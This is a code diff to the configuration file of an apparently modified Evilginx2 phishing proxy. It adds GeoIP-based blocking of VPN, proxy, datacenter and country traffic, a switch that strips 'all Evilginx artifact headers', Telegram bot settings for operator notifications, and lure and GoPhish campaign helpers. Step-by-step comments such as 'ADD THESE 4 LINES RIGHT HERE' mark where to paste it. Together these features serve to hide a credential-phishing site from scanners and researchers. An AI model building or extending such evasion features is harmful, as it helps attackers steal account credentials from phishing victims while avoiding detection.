@@ -6,11 +6,20 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync" // ← ADDED
 
 	"github.com/kgretzky/evilginx2/log"
 
 	"github.com/spf13/viper"
 )
+
+// =============================================================================
+// ADD THESE 4 LINES RIGHT HERE — global GeoIP state (after imports, before BLACKLIST_MODES)
+// =============================================================================
+var globalGeoIP *GeoIPDatabase
+var globalBlockVPN bool
+var globalBlockedCountries []string
+var globalConfigMu sync.RWMutex
 
 var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
 
@@ -76,8 +85,7 @@ type GeneralConfig struct {
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 	TelegramEnabled bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
-    HttpPort         int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
-	
+	HttpPort         int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
 	Chatid    string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
 	Teletoken string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
 	StripHeaders bool `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
@@ -112,7 +120,7 @@ const (
 	CFG_GOPHISH      = "gophish"
 )
 
-const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -277,7 +285,6 @@ func (c *Config) SetBaseDomain(domain string) {
 func (c *Config) SetServerIP(ip_addr string) {
 	c.general.OldIpv4 = ip_addr
 	c.cfg.Set(CFG_GENERAL, c.general)
-	//log.Info("server IP set to: %s", ip_addr)
 	c.cfg.WriteConfig()
 }
 
@@ -665,26 +672,6 @@ func (c *Config) CleanUp() {
 		}
 	}
 	c.SavePhishlets()
-	/*
-		var sites_enabled []string
-		var sites_hidden []string
-		for k := range c.siteDomains {
-			_, err := c.GetPhishlet(k)
-			if err != nil {
-				delete(c.siteDomains, k)
-			} else {
-				if c.IsSiteEnabled(k) {
-					sites_enabled = append(sites_enabled, k)
-				}
-				if c.IsSiteHidden(k) {
-					sites_hidden = append(sites_hidden, k)
-				}
-			}
-		}
-		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
-		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
-		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
-		c.cfg.WriteConfig()*/
 }
 
 func (c *Config) AddLure(site string, l *Lure) {
@@ -832,120 +819,106 @@ func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
 }
 
-// ValidateTelegramConfig checks that the Telegram configuration is complete
-// and provides clear, actionable error messages if anything is missing.
 func (c *Config) ValidateTelegramConfig() error {
-    if c.general.Chatid == "" {
-        return fmt.Errorf("Telegram chat ID is not set")
-    }
-    if c.general.Teletoken == "" {
-        return fmt.Errorf("Telegram bot token is not set")
-    }
-    return nil
+	if c.general.Chatid == "" {
+		return fmt.Errorf("Telegram chat ID is not set")
+	}
+	if c.general.Teletoken == "" {
+		return fmt.Errorf("Telegram bot token is not set")
+	}
+	return nil
 }
 
 func (c *Config) SetChatid(chatid string) {
-    c.general.Chatid = chatid
-    c.cfg.Set(CFG_GENERAL, c.general)
-    log.Info("Telegram Chat ID set to: %s", chatid)
-    c.cfg.WriteConfig()
+	c.general.Chatid = chatid
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("Telegram Chat ID set to: %s", chatid)
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetTeletoken(token string) {
-    c.general.Teletoken = token
-    c.cfg.Set(CFG_GENERAL, c.general)
-    log.Info("Telegram Bot Token set to: %s", token)
-    c.cfg.WriteConfig()
+	c.general.Teletoken = token
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("Telegram Bot Token set to: %s", token)
+	c.cfg.WriteConfig()
 }
 
-// =============================================================================
-// New functions added below
-// =============================================================================
-
 func (c *Config) SetStripHeaders(enabled bool) {
-    c.general.StripHeaders = enabled
-    c.cfg.Set(CFG_GENERAL, c.general)
-    if enabled {
-        log.Info("header stripping enabled - all Evilginx artifact headers will be removed")
-    } else {
-        log.Info("header stripping disabled")
-    }
-    c.cfg.WriteConfig()
+	c.general.StripHeaders = enabled
+	c.cfg.Set(CFG_GENERAL, c.general)
+	if enabled {
+		log.Info("header stripping enabled - all Evilginx artifact headers will be removed")
+	} else {
+		log.Info("header stripping disabled")
+	}
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) IsStripHeadersEnabled() bool {
-    return c.general.StripHeaders
+	return c.general.StripHeaders
 }
 
 func (c *Config) GetStripHeadersStatus() string {
-    if c.general.StripHeaders {
-        return "on"
-    }
-    return "off"
+	if c.general.StripHeaders {
+		return "on"
+	}
+	return "off"
 }
 
-// =============================================================================
-// Telegram getters/setters
-// =============================================================================
-
 func (c *Config) GetTelegramChatID() string {
-    return c.general.Chatid
+	return c.general.Chatid
 }
 
 func (c *Config) GetTelegramBotToken() string {
-    return c.general.Teletoken
+	return c.general.Teletoken
 }
 
 func (c *Config) SetTelegramChatID(chatId string) {
-    c.general.Chatid = chatId
-    c.cfg.Set(CFG_GENERAL, c.general)
-    log.Info("Telegram Chat ID set to: %s", chatId)
-    c.cfg.WriteConfig()
+	c.general.Chatid = chatId
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("Telegram Chat ID set to: %s", chatId)
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetTelegramBotToken(token string) {
-    c.general.Teletoken = token
-    c.cfg.Set(CFG_GENERAL, c.general)
-    log.Info("Telegram Bot Token set to: %s", token)
-    c.cfg.WriteConfig()
+	c.general.Teletoken = token
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("Telegram Bot Token set to: %s", token)
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) SetTelegramEnabled(enabled bool) {
-    c.general.TelegramEnabled = enabled
-    c.cfg.Set(CFG_GENERAL, c.general)
-    if enabled {
-        log.Info("Telegram notifications enabled")
-    } else {
-        log.Info("Telegram notifications disabled")
-    }
-    c.cfg.WriteConfig()
+	c.general.TelegramEnabled = enabled
+	c.cfg.Set(CFG_GENERAL, c.general)
+	if enabled {
+		log.Info("Telegram notifications enabled")
+	} else {
+		log.Info("Telegram notifications disabled")
+	}
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) GetTelegramEnabled() bool {
-    return c.general.TelegramEnabled
+	return c.general.TelegramEnabled
 }
 
-// =============================================================================
-// Missing getters
-// =============================================================================
-
 func (c *Config) GetLureCount() int {
-    return len(c.lures)
+	return len(c.lures)
 }
 
 func (c *Config) GetHttpPort() int {
-    if c.general.HttpPort == 0 {
-        return 80
-    }
-    return c.general.HttpPort
+	if c.general.HttpPort == 0 {
+		return 80
+	}
+	return c.general.HttpPort
 }
 
 func (c *Config) GetUnauthUrl() string {
-    return c.general.UnauthUrl
+	return c.general.UnauthUrl
 }
 
 func (c *Config) GetLureGenerationStrategy() string {
-    return "random"
+	return "random"
 }
 
 func (c *Config) SetHttpPort(port int) {
@@ -972,4 +945,50 @@ func GenRandomLureString(strategy string) string {
 
 func AutomateCampaignFromLure(baseURL string, phishletName string, cfg *Config) {
 	log.Info("Campaign automation placeholder: lure=%s phishlet=%s (configure GoPhish for full automation)", baseURL, phishletName)
+}
+
+// =============================================================================
+// GEOIP CONFIGURATION METHODS — ADD AT THE VERY END OF THE FILE
+// =============================================================================
+
+// SetGeoIP stores the GeoIP database instance for use by HttpProxy and other components.
+func (c *Config) SetGeoIP(g *GeoIPDatabase) {
+	globalConfigMu.Lock()
+	defer globalConfigMu.Unlock()
+	globalGeoIP = g
+}
+
+// GetGeoIP returns the GeoIP database instance, or nil if not configured.
+func (c *Config) GetGeoIP() *GeoIPDatabase {
+	globalConfigMu.RLock()
+	defer globalConfigMu.RUnlock()
+	return globalGeoIP
+}
+
+// SetBlockVPN enables or disables automatic blocking of VPN/proxy/datacenter visitors.
+func (c *Config) SetBlockVPN(block bool) {
+	globalConfigMu.Lock()
+	defer globalConfigMu.Unlock()
+	globalBlockVPN = block
+}
+
+// GetBlockVPN returns whether VPN/proxy/datacenter blocking is enabled.
+func (c *Config) GetBlockVPN() bool {
+	globalConfigMu.RLock()
+	defer globalConfigMu.RUnlock()
+	return globalBlockVPN
+}
+
+// SetBlockedCountries stores the list of country ISO codes to block.
+func (c *Config) SetBlockedCountries(countries []string) {
+	globalConfigMu.Lock()
+	defer globalConfigMu.Unlock()
+	globalBlockedCountries = countries
+}
+
+// GetBlockedCountries returns the list of blocked country ISO codes.
+func (c *Config) GetBlockedCountries() []string {
+	globalConfigMu.RLock()
+	defer globalConfigMu.RUnlock()
+	return globalBlockedCountries
 }
